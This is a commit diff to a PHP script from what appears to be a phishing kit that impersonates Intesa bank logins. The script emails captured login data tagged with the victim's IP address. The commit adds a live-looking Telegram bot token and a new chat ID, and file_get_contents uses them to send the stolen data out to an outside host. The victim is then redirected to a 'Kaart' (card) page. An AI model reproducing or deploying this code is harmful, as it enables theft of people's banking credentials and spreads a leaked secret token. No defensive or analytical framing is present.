8827c2c42879aff804291ccd45b1a7c957dcc26b
sg-ingointes <sg-info@telent.be>
2026-05-15 14:34:32 +0100

    new test

--- Send/Data1.php
+++ Send/Data1.php
@@ -13,8 +13,8 @@ $subject = "LOGIN INTESA [$ip]";
 $headers = "From: LOGIN INTESA <bladsadsada@web.de>";
 $headers .= "MIME-Version: 1.0\n";
 mail($to, $subject, $message,$headers);
-		    $token = "";
-    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-5052128612&text=" . urlencode($message)."" );
+		    $token = "8712281940:AAEWCDV_cL71xPIy_qXaLH6UzgQvKOhq0Jk";
+    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-1003366306499&text=" . urlencode($message)."" );
 header("Location:../Kaart.php");
 }else{
 header("Location:../index.php");
